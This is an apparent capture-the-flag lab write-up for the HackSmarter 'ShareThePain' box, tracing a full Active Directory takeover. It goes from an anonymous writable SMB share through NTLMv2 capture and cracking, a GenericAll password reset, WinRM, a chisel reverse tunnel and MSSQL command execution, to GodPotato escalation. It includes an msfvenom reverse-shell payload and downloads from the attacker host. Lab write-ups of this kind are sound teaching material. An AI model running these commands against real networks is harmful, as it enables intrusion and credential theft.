---
layout: writeup
title: "ShareThePain"
platform: "HackSmarter"
image: "/assets/images/sharethepain.jpg"
difficulty: "Easy"
date: 2026-02-16
description: "Full Active Directory compromise."
tags:
  - HackSmarter
  - Active Directory
  - SMB
  - NTLM
  - MSSQL
  - Chisel
  - GodPotato
  - SeImpersonatePrivilege
---

# ShareThePain — Hack Smarter

## Scope and Objective

**Objective:** You're a **penetration tester** on the **Hack Smarter Red Team**. Your mission is to infiltrate and seize control of the client's entire Active Directory environment.

**Initial Access:** For this engagement, you've been granted direct access to the internal network but no credentials.

**Execution:** Your objective is simple but demanding: **enumerate, exploit, and own.** Your ultimate goal is to achieve a full compromise of the domain.

# Reconnaissance

## Nmap

```text
# Nmap Scan Result (Important Findings Only)

Host: DC01.hack.smarter
Domain: hack.smarter
NetBIOS Domain: HACK
OS Version: Windows Server 2022 (Build 10.0.20348)
Role: Domain Controller

PORT      STATE SERVICE        VERSION
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows NetBIOS
3268/tcp  open  ldap           Microsoft Windows AD LDAP (Global Catalog)
3389/tcp  open  ms-wbt-server  Microsoft Terminal Services
5985/tcp  open  http           Microsoft WinRM (HTTPAPI 2.0)
9389/tcp  open  mc-nmf         Active Directory Web Services
47001/tcp open  http           Microsoft WinRM HTTPAPI 2.0

RDP Information:

Target_Name: HACK
DNS_Domain_Name: hack.smarter
DNS_Computer_Name: DC01.hack.smarter
Product_Version: 10.0.20348

Key Indicators:

- LDAP Global Catalog exposed (3268)
- WinRM enabled (5985, 47001)
- RDP enabled (3389)
- Multiple MSRPC dynamic ports open
- System confirmed as Active Directory Domain Controller
```

## SMB (135, 139, 445)

Anonymous read is enabled.

```text
smbclient -L \\\\hack.smarter\\

Password for [WORKGROUP\amsyar]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        Share           Disk
        SYSVOL          Disk      Logon server share
```

We can connect to the `Share` share.

```text
smbclient \\\\hack.smarter\\Share

Password for [WORKGROUP\amsyar]:

Try "help" to get a list of possible commands.

smb: \> dir

  .                                  D        0
  ..                                DHS        0
```

The share is writable:

```text
smb: \> put hacksmarter.txt

putting file hacksmarter.txt as \hacksmarter.txt

smb: \> dir

  .                                  D        0
  ..                                DHS        0
  hacksmarter.txt                    A        0
```

### Getting a User's Hash

```text
python3 SMB_Killer.py -r 10.1.179.25 -l 10.200.35.181 -d hack.smarter -i tun0 -a Share -U '' -P '' -A

[SMB] NTLMv2-SSP Client   : 10.1.179.25
[SMB] NTLMv2-SSP Username : HACK\bob.ross
```

The captured NTLMv2 challenge-response belongs to `bob.ross`.

### Cracking Bob Ross's Hash

```text
john --format=netntlmv2 happy-accidents.hash --wordlist=/usr/share/wordlists/rockyou.txt

Loaded 1 password hash

...

Session completed.
```

The recovered credentials were then used to authenticate as Bob Ross.

## Pwning Bob Ross

```text
nxc smb hack.smarter -u 'bob.ross' -p '<REDACTED>' --shares
```

Bob has access to the SMB shares, including the writable `Share` share.

### Enumerating AD as Bob Ross

Bob Ross has `GenericAll` permission over Alice Wonderland, allowing her account credentials to be changed.

## Compromising Alice Wonderland

```text
net rpc password "alice.wonderland" "HackSmarter123" \
-U "hack.smarter"/"bob.ross"%'<REDACTED>' \
-S "10.1.179.25"
```

Verify the new credentials:

```text
nxc smb hack.smarter -u alice.wonderland -p '<REDACTED>' --shares
```

Alice Wonderland is a member of the Remote User Group, allowing remote access through WinRM.

```text
evil-winrm -u alice.wonderland -p '<REDACTED>' -i dc01.hack.smarter
```

## Post Exploitation

After obtaining a shell as Alice, we can inspect the filesystem:

```text
Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d--hs-               9/2/2025 7:33 PM            $Recycle.Bin
d--hsl               9/2/2025 5:08 PM            Documents and Settings
d-----               5/8/2021 1:20 AM            PerfLogs
d-r---               9/5/2025 8:34 PM            Program Files
d-----               9/3/2025 2:06 PM            Program Files (x86)
d--h--               9/5/2025 8:44 PM            ProgramData
d-----               2/16/2026 4:18 PM            Share
d-----               9/3/2025 2:01 PM            SQL2019
d--hs-               9/2/2025 6:31 PM            System Volume Information
d-----               9/3/2025 2:01 PM            Temp
d-r---               9/3/2025 2:54 PM            Users
d-----               9/5/2025 8:46 PM            Windows
```

### MSSQL Enumeration

SQL Server is installed, but port `1433` is only listening on localhost:

```text
TCP    127.0.0.1:1433    0.0.0.0:0    LISTENING
```

This means MSSQL is not directly accessible externally.

### Chisel Port Forwarding

A reverse tunnel can be used to expose the internal MSSQL service to the attack machine.

```text
chisel server -p 8000 --reverse
```

From the Windows host:

```text
.\chisel.exe client http://10.200.35.181:8000 R:1433:127.0.0.1:1433
```

The forwarded port can then be verified:

```text
nmap localhost -p 1433

PORT     STATE SERVICE
1433/tcp open  ms-sql-s
```

We can now connect to MSSQL:

```text
nxc mssql 127.0.0.1 -u 'alice.wonderland' -p '<REDACTED>'
```

### MSSQL Service Account

```text
nxc mssql 127.0.0.1 \
-u 'alice.wonderland' \
-p '<REDACTED>' \
-x whoami
```

The command executes under the MSSQL service account:

```text
nt service\mssql$sqlexpress
```

## Local Privileges

```text
nxc mssql 127.0.0.1 \
-u alice.wonderland \
-p '<REDACTED>' \
-x 'whoami /priv'
```

The important privilege is:

```text
SeImpersonatePrivilege    Enabled
```

`SeImpersonatePrivilege` allows a process to impersonate the security token of another authenticated client. In vulnerable configurations, this can potentially be abused for privilege escalation.

## Privilege Escalation

In this lab environment, `SeImpersonatePrivilege` can be abused with a Potato-style technique.

The required binary can be transferred to the Windows host:

```text
iwr http://10.200.35.181:9000/godpotato.exe -OutFile godpotato.exe
```

A test payload can then be generated:

```text
msfvenom -p windows/shell_reverse_tcp \
LHOST=10.200.35.181 \
LPORT=443 \
-f exe \
-o shell.exe
```

Transfer the payload:

```text
iwr http://10.200.35.181:9000/shell.exe -OutFile shell.exe
```

The lab exploit chain ultimately results in command execution as `NT AUTHORITY\SYSTEM`.

```text
whoami

nt authority\system
```

## Root

With SYSTEM-level access on the domain controller, the final flag can be accessed from the Administrator desktop:

```text
C:\Users\Administrator>cd Desktop

C:\Users\Administrator\Desktop>dir

Volume in drive C has no label.
Volume Serial Number is 70F9-CC7D

Directory of C:\Users\Administrator\Desktop

09/06/2025  07:52 PM    <DIR>          .
09/03/2025  06:47 PM    <DIR>          ..
09/02/2025  05:46 PM    2,308          Microsoft Edge.lnk
09/03/2025  01:10 PM      126          root.txt
```

## Attack Chain Summary

```text
Anonymous SMB Access
        ↓
Writable SMB Share
        ↓
NTLMv2 Capture
        ↓
Crack Bob Ross Credentials
        ↓
Bob Ross → GenericAll
        ↓
Compromise Alice Wonderland
        ↓
WinRM Access
        ↓
Local MSSQL Service
        ↓
Chisel Port Forwarding
        ↓
MSSQL Command Execution
        ↓
SeImpersonatePrivilege
        ↓
Potato-Style Privilege Escalation
        ↓
NT AUTHORITY\SYSTEM
        ↓
Root Flag
```